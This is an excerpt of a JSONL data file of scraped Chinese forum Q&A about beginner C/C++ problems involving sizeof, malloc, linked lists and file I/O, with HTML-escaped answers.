"\nLinkList *phead;", "\nphead=CreateList(3); ", "\n}"]], "Tag": "程序设计"}
{"Answer": "编译器，觉得你那个不是静态的量，所以编译不通过", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++基础问题，关于定义数组。", ["由于长期没有接触C++，以前的基础知识都忘了，问题是这样的：", "\n首先，我有一个结构体：", "\nstruct MyConn{", "\nint a;", "\nchar b;", "\n}", "\nint device_size=sizeof(MyConn);", "\n为什么在我定义数组长度的时候", "\nchar rece[sizeof(MyConn)] 这样定义是正确的；", "\n但是，", "\nchar rece[device_size]却是错误的？", "\n求解！！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;加头文件#include&amp;lt;stdlib.h&amp;gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言员工考勤系统设计", ["  Attendance ", "attendance = (Attendance", ")malloc(sizeof(Attendance));", "    [Error] 'malloc' was not declared in this scope"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof的结果是unsigned类型的值&amp;#xff0c;而%d输出的是signed类型的值&amp;#xff0c;类型不匹配&amp;#xff0c;所以给出了警告。可以增加强制类型转换&amp;#xff1a;int(sizeof(int))&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我想计算整型变量int的大小，为什么它会出现这样的警告！“大小不匹配”是什么意思？", ["\n", "\n", "#", "include", " ", "<stdio.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n    ", "printf", "(", "\"%d\\n\"", ",", "sizeof", "(", "int", "));\n    ", "return", " ", "0", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "col在哪里定义的，是常数么？\r\n如果不是，不能这么写\r\n可以写int *a = (int *) malloc(col * sizeof(int));", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中动态分配二维数组", ["int *a[col] = (int *) malloc(col * sizeof(int));", "\n这一句话为什么错了，为什么不能用指针数组动态分配二维数组？", "\n是不是只能用int **a才能动态分配二维数组？"]], "Tag": "程序设计"}
{"Answer": "```\r\n#include&lt;stdio.h&gt;\r\n#include&lt;string.h&gt;\r\n#include&lt;stdlib.h&gt;\r\ntypedef struct Shu{//存储站名序号// \r\n\tchar name[10];\r\n\tint x;\r\n\tstruct Shu *next;\r\n}*S,s;\r\ntypedef struct Zhan{\r\n\tchar name[10];\r\n\tint sum;//存储到下一个站的距离// \r\n\tint x;//标记序号// \r\n\tstruct Zhan *next;\r\n}*Z,z;\r\ntypedef struct Lu{\r\n\tchar name[10];\r\n\tstruct Lu *next;\r\n}*L,l;\r\nbool meue3();\r\nstruct Lu *Read1();\r\nstruct Shu *Read2();\r\nstruct Zhan *Read3(char *);\r\nvoid BC1(L *);\r\nvoid BC2(S *);\r\nvoid BC3(Z *,char *);\r\nvoid Zhan_add(L *,S *);\r\nvoid Zhan_xg(L *,S *);\r\nvoid Zhan_shan(L *);\r\nvoid put(L *,char *,Z *);\r\nint search(S *,char *);\r\nint main(){\r\n\t while(meue3()){\r\n\t }\r\n\t return 0;\r\n}\r\nint search(S *H2,char *N){//给站点编号//\r\n\tint n=0;\r\n\tS h2=*H2;\r\n\tn=h2-&gt;x;\r\n\twhile(h2!=NULL){\r\n\t\tif(strcmp(N,h2-&gt;name)==0){\r\n\t\t\treturn h2-&gt;x;\r\n\t\t}\r\n\t\th2=h2-&gt;next;\r\n\t}\r\n\tn++;\r\n\tS h3=(S)malloc(sizeof(s));\r\n\th3-&gt;next=NULL;\r\n\tstrcpy(h3-&gt;name,N);\r\n\th3-&gt;x=n;\r\n\th3-&gt;next=(*H2);\r\n\t(*H2)=h3;\r\n\treturn n;\r\n}\r\nvoid Zhan_add(L *H1,S *H2){\r\n\tchar n[10],N[10];\r\n\tZ H3=NULL,h3;\r\n\tprintf(\"输入要操作的公交线路\\n\");\r\n\tscanf(\"%s\",N);\r\n\tput(&amp;(*H1),N,&amp;H3);\r\n\tif(H3!=NULL){\r\n\t\th3=H3;\r\n\t\twhile(h3-&gt;next-&gt;next!=NULL)\r\n\t\th3=h3-&gt;next;//h3指向公交车倒数第二个站点// \r\n\t\tZ h2=(Z)malloc(sizeof(z));\r\n\t\th2-&gt;next=NULL;\r\n\t\tprintf(\"\\n输入要插入的站名\\n\");\r\n\t\tscanf(\"%s\",&amp;h2-&gt;name);\r\n\t\tint i; \r\n\t\th2-&gt;x=search(&amp;(*H2),h2-&gt;name);//给站点编号// \r\n\t\th2-&gt;sum=0;\r\n\t\tprintf(\"1.设置新的起点 2.设置新的终点 3.插入新站\\n\");\r\n\t\tscanf(\"%d\",&amp;i);\r\n\t\tswitch(i){\r\n\t\t\tcase 1:\r\n\t\t\t\tprintf(\"输入%s到%s的距离\\n\",h2-&gt;name,H3-&gt;name);\r\n\t\t\t\tscanf(\"%d\",&amp;h2-&gt;sum);\r\n\t\t\t\th2-&gt;next=H3;\r\n\t\t\t\tH3=h2;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\th3=h3-&gt;next;\r\n\t\t\t\tprintf(\"输入%s到%s的距离\\n\",h3-&gt;name,h2-&gt;name);\r\n\t\t\t\tscanf(\"%d\",&amp;h3-&gt;sum);\r\n\t\t\t\th3-&gt;next=h2;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tZ h4=H3;\r\n\t\t\t\tprintf(\"输入要插入的位置的前面一个站点\\n\");\r\n\t\t\t\tscanf(\"%s\",n);\r\n\t\t\t\twhile(h4!=NULL){\r\n\t\t\t\t\tif(strcmp(h4-&gt;name,n)==0){\r\n\t\t\t\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h4-&gt;name,h2-&gt;name);\r\n\t\t\t\t\t\tscanf(\"%d\",&amp;h4-&gt;sum);\r\n\t\t\t\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h2-&gt;name,h4-&gt;next-&gt;name);\r\n\t\t\t\t\t\tscanf(\"%d\",&amp;h2-&gt;sum);\r\n\t\t\t\t\t\th2-&gt;next=h4-&gt;next;\r\n\t\t\t\t\t\th4-&gt;next=h2;\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\th4=h4-&gt;next;\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t\tBC3(&amp;H3,N);\r\n\t\tprintf(\"成功添加站点\\n\");\r\n\t}\r\n}\r\nvoid Zhan_xg(L *H1,S *H2){\r\n\tchar n[10],N[10];\r\n\tZ H3=NULL,h3,h4;\r\n\tprintf(\"输入要操作的公交线路\\n\");\r\n\tscanf(\"%s\",N);\r\n\tput(&amp;(*H1),N,&amp;H3);\r\n\tif(H3!=NULL){\r\n\t\th3=H3;\r\n\t\twhile(h3-&gt;next-&gt;next!=NULL)\r\n\t\th3=h3-&gt;next;//h3指向公交车倒数第二个站点// \r\n\t\th4=H3;\r\n\t\tZ h2=(Z)malloc(sizeof(z));\r\n\t\th2-&gt;next=NULL;\r\n\t\tprintf(\"\\n输入要修改的站点\\n\");\r\n\t\tscanf(\"%s\",n);\r\n\t\tprintf(\"输入新的站点名\\n\");\r\n\t\tscanf(\"%s\",&amp;h2-&gt;name);\r\n\t\th2-&gt;sum=0;\r\n\t\th2-&gt;x=search(&amp;(*H2),h2-&gt;name);\r\n\t\tif(strcmp(h4-&gt;name,n)==0){//修改节点为头节点// \r\n\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h2-&gt;name,h4-&gt;next-&gt;name);\r\n\t\t\tscanf(\"%d\",&amp;h2-&gt;sum);\r\n\t\t\th2-&gt;next=H3-&gt;next;\r\n\t\t\tH3=h2;\r\n\t\t}\r\n\t\telse if(strcmp(h3-&gt;next-&gt;name,n)==0){//修改节点为尾节点// \r\n\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h3-&gt;name,h2-&gt;name);\r\n\t\t\tscanf(\"%d\",&amp;h3-&gt;sum);\r\n\t\t\th3-&gt;next=h2; \r\n\t\t}\r\n\t\telse{\r\n\t\t\twhile(h4!=NULL){\r\n\t\t\t\tif(strcmp(h4-&gt;next-&gt;name,n)==0){\r\n\t\t\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h4-&gt;name,h2-&gt;name);\r\n\t\t\t\t\tscanf(\"%d\",&amp;h4-&gt;sum);\r\n\t\t\t\t\tprintf(\"输入%s站到%s站的距离\\n\",h2-&gt;name,h4-&gt;next-&gt;next-&gt;name);\r\n\t\t\t\t\tscanf(\"%d\",&amp;h2-&gt;sum);\r\n\t\t\t\t\th2-&gt;next=h4-&gt;next-&gt;next;\r\n\t\t\t\t\th4-&gt;next=h2;\r\n\t\t\t\t\tbreak;\r\n\t\t        }\r\n\t\t\t\th4=h4-&gt;next;\r\n\t\t\t}\r\n\t\t}\r\n\t\tprintf(\"成功修改站点\\n\");\r\n\t\tBC3(&amp;H3,N);\r\n\t}\r\n}\r\nvoid Zhan_shan(L *H1){\r\n\tchar n[10],N[10];\r\n\tZ H2=NULL,h3,h2;\r\n\tprintf(\"输入要操作的公交线路\\n\");\r\n\tscanf(\"%s\",N);\r\n\tput(&amp;(*H1),N,&amp;H2);\r\n\tif(H2!=NULL){\r\n\t\th3=H2;\r\n\t\twhile(h3-&gt;next-&gt;next!=NULL)\r\n\t\th3=h3-&gt;next;//h3指向公交车倒数第二个站点// \r\n\t\tprintf(\"\\n输入要删除的站点:\\n\");\r\n\t\tscanf(\"%s\",n);\r\n\t\th2=H2;\r\n\t\tif(strcmp(h2-&gt;name,n)==0){//删除站点为头节点//\r\n\t\t\tH2=H2-&gt;next;\r\n\t\t}\r\n\t\telse if(strcmp(h3-&gt;next-&gt;name,n)==0){//删除站点为尾节点//\r\n\t\t\th3-&gt;next=NULL;\r\n\t\t\th3-&gt;sum=0;\r\n\t\t}\r\n\t\telse{\r\n\t\t\twhile(h2!=NULL){\r\n\t\t\t\tif(strcmp(h2-&gt;next-&gt;name,n)==0){\r\n\t\t\t\t\tprintf(\"输入%s站到%s站的距离:\\n\",h2-&gt;name,h2-&gt;next-&gt;next-&gt;name);\r\n\t\t\t\t\tscanf(\"%d\",&amp;h2-&gt;sum);\r\n\t\t\t\t\th2-&gt;next=h2-&gt;next-&gt;next;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\th2=h2-&gt;next;\r\n\t\t\t}\r\n\t\t}\r\n\t\tBC3(&amp;H2,N);\r\n\t\tprintf(\"成功删除站点\\n\");\r\n\t}\r\n}\r\nbool meue3(){\r\n\tbool N=true;\r\n\tL H1;\r\n\tH1=Read1();\r\n\tH1=H1-&gt;next;\r\n\tS H2;\r\n\tH2=Read2();\r\n\tH2=H2-&gt;next;\r\n\tprintf(\"1.站点添加  2.站点修改  3.站点删除  4.返回主页面\\n\");\r\n\tint n;\r\n\tscanf(\"%d\",&amp;n);\r\n\tswitch(n){\r\n\t\tcase 1:\r\n\t\t\tZhan_add(&amp;H1,&amp;H2);\r\n\t\t\tBC2(&amp;H2);\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tZhan_xg(&amp;H1,&amp;H2);\r\n\t\t\tBC2(&amp;H2);\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tZhan_shan(&amp;H1);\r\n\t\t\tbreak;\r\n\t\tcase 4:\r\n\t\t\tN=false;\r\n\t\t\tbreak;\r\n\t} \r\n\tBC1(&amp;H1);\r\n\treturn N;\r\n}\r\nvoid put(L *H1,char *N,Z *H2){\r\n\tL h1=*H1;\r\n\twhile(h1!=NULL){\r\n\t\tif(strcmp(h1-&gt;name,N)==0)\r\n\t\tbreak;\r\n\t\th1=h1-&gt;next;\r\n\t}\r\n\tif(h1==NULL)\r\n\tprintf(\"没有找到该公交线\\n\");\r\n\telse{\r\n\t\tprintf(\"%s公交路线如下：\\n\",N);\r\n\t\t(*H2)=Read3(N);\r\n\t\t(*H2)=(*H2)-&gt;next;\r\n\t\tZ h3=(*H2),h2=(*H2);\r\n\t\tprintf(\"%s %d %d\",h2-&gt;name,h2-&gt;sum,h2-&gt;x);\r\n\t\th2=h2-&gt;next;\r\n\t\tif(h2!=NULL){\r\n\t\t\twhile(h2!=NULL){//输出所有站// \r\n\t\t\t\tprintf(\"-&gt;%s %d %d\",h2-&gt;name,h2-&gt;sum,h2-&gt;x);\r\n\t\t\t\th2=h2-&gt;next;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nvoid BC3(Z *head,char *N){//保存公交路线的所有站点// \r\n\tFILE *f;\r\n\tZ p=(*head);\r\n\tchar F[200]=\"C:\\\\Users\\\\许和伟\\\\Desktop\\\\\";\r\n\tstrcat(F,N);\r\n\tchar f1[10]=\".txt\";\r\n\tstrcat(F,f1);\r\n\tf=fopen(F,\"w+\");\r\n\twhile(p!=NULL){\r\n\t\tfwrite(p,sizeof(z),1,f);\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tfclose(f);\r\n}\r\nstruct Zhan *Read3(char *N){//读取公交路线的所有站点// \r\n\tFILE *f;\r\n\tchar F[200]=\"C:\\\\Users\\\\许和伟\\\\Desktop\\\\\";\r\n\tstrcat(F,N);\r\n\tchar f1[10]=\".txt\";\r\n\tstrcat(F,f1);\r\n\tf=fopen(F,\"r+\");\r\n\tZ p,head;\r\n\thead=(Z)malloc(sizeof(z));\r\n\thead-&gt;next=NULL;\r\n\tp=head;\r\n\twhile(1){\r\n\t\tZ q;\r\n\t\tq=(Z)malloc(sizeof(z));\r\n\t\tfread(q,sizeof(z),1,f);\r\n\t\tif(feof(f)){\r\n\t\t\tp-&gt;next=NULL;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tp-&gt;next=q;\r\n\t\tp=q;\r\n\t\tp-&gt;next=NULL;\r\n\t}\r\n\tfclose(f);\r\n\treturn head;\r\n}\r\nvoid BC2(S *head){//保存所有站点编号// \r\n\tFILE *f;\r\n\tS p=*head;\r\n\tf=fopen(\"Shu.txt\",\"w+\");\r\n\twhile(p!=NULL){\r\n\t\tfwrite(p,sizeof(s),1,f);\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tfclose(f);\r\n}\r\nstruct Shu *Read2(){//读取所有站点编号// \r\n\tFILE *f;\r\n\tS head,p;\r\n\thead=(S)malloc(sizeof(s));\r\n\thead-&gt;next=NULL;\r\n\tf=fopen(\"Shu.txt\",\"r+\");\r\n\tp=head;\r\n\twhile(1){\r\n\t\tShu* q;\r\n\t\tq=(S)malloc(sizeof(s));\r\n\t\tfread(q,sizeof(s),1,f);\r\n\t\tif(feof(f)){\r\n\t\t\tp-&gt;next=NULL;\r\n\t\t\tfree(q);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tq-&gt;next=NULL;\r\n\t\tp-&gt;next=q;\r\n\t\tp=q;\r\n\t}\r\n\tfclose(f);\r\n\treturn head;\r\n}\r\nvoid BC1(L *head){//保存所有公交名字// \r\n\tFILE *f;\r\n\tL p=(*head);\r\n\tf=fopen(\"LU.txt\",\"w+\");\r\n\twhile(p!=NULL){\r\n\t\tfwrite(p,sizeof(l),1,f);\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tfclose(f);\r\n}\r\nstruct Lu *Read1(){//读取所有公交名字//\r\n\tFILE *f;\r\n\tL head,p;\r\n\thead=(L)malloc(sizeof(l));\r\n\thead-&gt;next=NULL;\r\n\tf=fopen(\"LU.txt\",\"r+\");\r\n\tp=head;\r\n\twhile(!feof(f)){\r\n\t\tL q;\r\n\t\tq=(L)malloc(sizeof(l));\r\n\t\tfread(q,sizeof(l),1,f);\r\n\t\tif(feof(f)){\r\n\t\t\tfree(q);\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tp-&gt;next=q;\r\n\t\tp=q;\r\n\t\tp-&gt;next=NULL;\r\n\t}\r\n\tfclose(f);\r\n\treturn head;\r\n}\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言文件读取写入的问题", ["我用以下代码进行读写操作一次以后，文件照常写入，可是第二次读取后就有一部分莫名消失", "\n求大神指点", "\n\n", "typedef struct Shu{//存储站名序号// \n    char name[10];\n    int x;\n    struct Shu *next;\n}*S,s;\nvoid BC2(S *head){//保存所有站点编号// \n    FILE *f;\n    S p=*head;\n    f=fopen(\"Shu.txt\",\"w+\");\n    while(p!=NULL){\n        fwrite(p,sizeof(s),1,f);\n        p=p->next;\n    }\n    fclose(f);\n}\nstruct Shu *Read2(){//读取所有站点编号// \n    FILE *f;\n    S head,p;\n    head=(S)malloc(sizeof(s));\n    head->next=NULL;\n    f=fopen(\"Shu.txt\",\"r+\");\n    p=head;\n    while(1){\n        Shu* q;\n        q=(S)malloc(sizeof(s));\n        fread(q,sizeof(s),1,f);\n        if(feof(f)){\n            p->next=NULL;\n            free(q);\n            break;\n        }\n        q->next=NULL;\n        p->next=q;\n        p=q;\n    }\n    fclose(f);\n    return head;\n}\n"]], "Tag": "程序设计"}
{"Answer": "scanf(\"%d\",p-&gt;data);\r\n-&gt;\r\nscanf(\"%d\",&amp;p-&gt;data);\r\n\r\n# 问题解决请采纳，不采纳会影响今后提问。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问哪位大佬知道为什么这个代码运行后print输出的异常为什么", ["#include", "\n#include", "\ntypedef struct splist", "\n{", "\n    int data;", "\n    splist ", "next;", "\n } splist;", "\nsplist *CJ(splist *L)", "\n {", "\n    L=(splist", ")malloc(sizeof(splist));", "\n    L->next=NULL;", "\n    splist ", "p;", "\n    int n,i;", "\n    printf(\"请输入建表的长度\");", "\n     scanf(\"%d\",&n);", "\n     for(i=0;i<n;i++)", "\n     {", "\n        p=(splist", ")malloc(sizeof(splist));", "\n         printf(\"请输入数据\");", "\n         scanf(\"%d\",p->data);", "\n         p->next=L->next;", "\n         L->next=p; ", "\n      } ", "\n      return (splist*)L;", "\n }", "\n  int print(splist *L){", "\n    splist *s=L->next;", "\n    while(s != NULL){", "\n        printf(\"%d \",s->data);", "\n        s = s->next;", "\n    }", "\n    return 0;", "\n}", "\n\n", "int main()", "\n {", "\n    splist ", "L=(splist", ")malloc(sizeof(splist));", "\n    L=CJ(L);", "\n\n", "print(L);\nreturn 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;改了下&amp;#xff0c;scanf里的&amp;amp;去掉了&amp;#xff0c;试试看&amp;#xff0c;还有加了个主函数&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/131836025146175.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;ex&lt;/span&gt;\n{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i;\n    &lt;span class=\"hljs-type\"&gt;float&lt;/span&gt; j;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; *s;\n};\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;func&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;ex&lt;/span&gt; *p &amp;#61;&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; ex));\n    p-&amp;gt;s &amp;#61; (&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;20&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;));\n    &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, p-&amp;gt;s);\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, p-&amp;gt;s);\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(p);\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;func&lt;/span&gt;();\n   &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言不知道问题出在哪里，代码和问题如下", ["#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "struct", " ", "ex", "\n{\n ", "int", " i;\n ", "float", " j;\n ", "char", " *s;\n};\n", "void", " ", "func", " ", "(", "void", ")", "\n", "{\n", "struct", " ", "ex", " *p = ", "malloc", "(", "sizeof", "(", "struct", " ex));\np->s = ", "malloc", "(", "20", " * ", "sizeof", "(", "char", "));\n", "scanf", "(", "\"%s\"", ", &p->s);\n", "printf", "(", "\"%s\"", ", p->s);\n", "free", "(p);\n}\n\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;printf(&amp;#34;%d\\n&amp;#34;,&amp;amp;L-&amp;gt;data);&lt;/p&gt;\n&lt;p&gt;改为&lt;br /&gt;printf(&amp;#34;%d\\n&amp;#34;,L-&amp;gt;data);&lt;br /&gt;不需要取地址了啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["单链表在使用头插法创建后，打印出来是乱码", ["问题遇到的现象和发生背景", "\n", "请教一下各位 为什么我的单链表在使用头插法创建后，打印出来是乱码", "\n", "代码", "\n", "#include<stdio.h>", "#include<stdlib.h>", "typedef struct LNode {", "\n", "struct  LNode* next", "; ", "\nint data", ";", "\n", "\n", "}LNode, * LinkList;", "\n", "LinkList HeadInsert(LinkList& L)", "{", "    LNode* p; int x;", "    L = (LinkList)malloc(sizeof(LNode)); //创建头结点", "    L->next = NULL;", "        scanf_s(\"%d\", &x);", "        while (x !=9999)         //输入9999时则结束插入", "        {", "            p = (LinkList)malloc(sizeof(LNode));", "            p->data = x;", "            p->next = L->next;", "            L->next = p;", "            scanf_s(\"%d\", &x);", "\n", "}\n", "return", " L;\n", "\n", "}", "\n", "int main()", "{", "    LinkList L;", "    HeadInsert(L);", "\n", "while", " (", "L", "->next!=", "NULL", ")\n{\n    printf(", "\"%d\\n\"", ",&", "L", "->", "data", ");", "\n    ", "L", " = ", "L", "->next;\n    \n}\n", "\n", "}", "#include<stdlib.h>", "typedef struct LNode {", "\n", "struct  LNode* next", "; ", "\nint data", ";", "\n", "\n", "}LNode, * LinkList;", "\n", "LinkList HeadInsert(LinkList& L)", "{", "    LNode* p; int x;", "    L = (LinkList)malloc(sizeof(LNode)); //创建头结点", "    L->next = NULL;", "        scanf_s(\"%d\", &x);", "        while (x !=9999)         //输入9999时则结束插入", "        {", "            p = (LinkList)malloc(sizeof(LNode));", "            p->data = x;", "            p->next = L->next;", "            L->next = p;", "            scanf_s(\"%d\", &x);", "\n", "}\n", "return", " L;\n", "\n", "}", "\n", "int main()", "{", "    LinkList L;", "    HeadInsert(L);", "\n", "while", " (", "L", "->next!=", "NULL", ")\n{\n    printf(", "\"%d\\n\"", ",&", "L", "->", "data", ");", "\n    ", "L", " = ", "L", "->next;\n    \n}\n", "\n", "}", "\n", "运行结果及报错内容", "\n", "\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;本来就是注释掉的代码&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个关于计数排序的问题", ["我在网上看到这样一个计数排序的例子", "int main()", "{", "    // 待排序数组", "    int nums[5] = {3, 1, 2, 0, 3};", "    // 用于排序数组", "    int newNums[4] = {0};", "    // 计算待排序数组长度", "    int len = sizeof(nums) / sizeof(nums[0]);", "    // 遍历待排序数组", "    for(int i = 0; i < len; i++){", "        // 取出待排序数组当前值", "        int index = nums[i];", "        // 将待排序数组当前值作为排序数组索引", "        // 将用于排序数组对应索引原有值+1", "        newNums[index] = newNums[index] +1;", "    }", "\n", "// 计算待排序数组长度\n", "int", " len2 = sizeof(newNums) / sizeof(newNums[", "0", "]);\n", "//", " 输出排序数组索引, 就是排序之后结果\n", "for", "(", "int", " i = ", "0", "; i < len2; i++){\n    ", "for", "(", "int", " j = ", "0", "; j < newNums[i]; j++){\n        ", "printf", "(", "\"%i\\n\"", ", i);\n    }\n}\n/*\n", "//", " 计算待排序数组长度\n", "int", " len2 = sizeof(newNums) / sizeof(newNums[", "0", "]);\n", "//", " 还原排序结果到待排序数组\n", "for", "(", "int", " i = ", "0", "; i < len2; i++){\n    ", "int", " ", "index", " = ", "0", ";\n    **", "for", "(", "int", " i = ", "0", "; i < len; i++)**{\n        ", "for", "(", "int", " j = ", "0", "; j < newNums[i]; j++){\n            nums[", "index", "++] = i;\n        }\n    }\n}\n*/\n", "return", " ", "0", ";\n", "\n", "}", "\n", "在倒数第八行四个**之间的代码，我发现删了也没什么影响，想问问这条代码有什么意义吗？", "补充：是删掉四个星号中间的for循环，发现结果没什么影响，换数组也是正确的。星号是我加的，方便人看到的，不是代码本身有的。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;long的范围是 -2147483648&amp;#xff5e;2147483647&amp;#xff0c;数据过大&amp;#xff0c;只是显示会有问题&amp;#xff0c;但是内存没有占用过大&amp;#xff0c;因为一个long也就4字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这样输出的n为负值呢？是溢出了吗", ["int", " ", "main", "()", "{\n        ", "int", " *p;\n        ", "long", " n = ", "1", ";\n        ", "while", " (p!=", "NULL", ")\n        {\n        n=n+", "1000000000", ";\n        p = (", "int", " *)", "malloc", "(", "sizeof", "(", "int", ")*n);\n    \n        }\n        ", "if", "(!p){\n                        ", "printf", "(", "\"%ld\\n\"", ",n);        \n                        ", "printf", "(", "\"hello\"", ");\n                    }\n        \n    ", "return", " ", "1", ";    \n}\n\n\n\n最后得到n为负值，是因为n达到了长整型能到达的最大值时，仍有内存空间可以分配吗？\n但为什么把n=n+", "1000000000", "的", "0", "去掉一个之后就能得到n为正值\n（都输出了hello）\n初学数据结构，感谢大家\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;在高版本上使用memcpy,strcpy以及scanf等方法&amp;#xff0c;会被编译器认为不安全&amp;#xff0c;都要求在后面加上_s。需要传递的参数也增加了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["scanf()函数为什么会用不了？", ["问题遇到的现象和发生背景", "\n", "使用Visual Studio 2022，scanf()函数用不了", "\n", "问题相关代码", "\n", "#", "include", " ", "<iostream>", "\n", "#", "include", "<stdio.h>", "\n", "using", " ", "namespace", " std;\n\n", "#", "define", " maxSize 100", "\n\n", "typedef", " ", "struct", " ", "LNode", "\n{\n    ", "int", " data;\n    ", "struct", " ", "LNode", "* next;\n}LNode;\n\n", "int", " ", "main", "()", "\n", "{\n    ", "void", " ", "createlistF", "(LNode * &, ", "int", " [], ", "int", " )", ";\n    ", "void", " ", "printlist", "(LNode *)", ";\n    LNode* C;\n    ", "int", " a[maxSize],n;\n    \n    cout << ", "\"Please enter the number of elements:\"", " << endl;\n    cin >> n;\n    ", "for", " (", "int", " i = ", "0", "; i < n; i++)\n    {\n        ", "scanf", "(", "\"%d\"", ", &a[i]);\n    }\n    ", "createlistF", "(C, a, n);\n    ", "printlist", "(C);\n\n    ", "return", " ", "0", ";\n}\n\n", "void", " ", "createlistF", "(LNode * &C, ", "int", " a[], ", "int", " n)", "\n", "{\n    LNode* s;\n\n    C = (LNode*)", "malloc", "(", "sizeof", "(LNode));        ", "//C is the head node of the linked list, it does't store datum", "\n    C->next = ", "NULL", ";\n    ", "for", " (", "int", " i = ", "0", "; i<n; i++)\n    {\n        s = (LNode*)", "malloc", "(", "sizeof", "(LNode));\n        s->next = C->next;\n        C->next = s;\n        s->data = a[i];\n    }\n\n    ", "return", ";\n}\n\n", "void", " ", "printlist", "(LNode* C)", "\n", "{\n    C = C->next;\n    ", "while", " (C)\n    {\n        ", "printf", "(", "\"%d\"", ", C->data);\n        ", "if", " (C->next)\n        {\n            ", "printf", "(", "\" -> \"", ");\n        }\n    }\n\n    ", "return", ";\n}\n\n", "\n", "运行结果及报错内容", "\n", "编译错误，第25行：Severity    Code    Description    Project    File    Line    Suppression State", "Error    C4996    'scanf': This function or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use 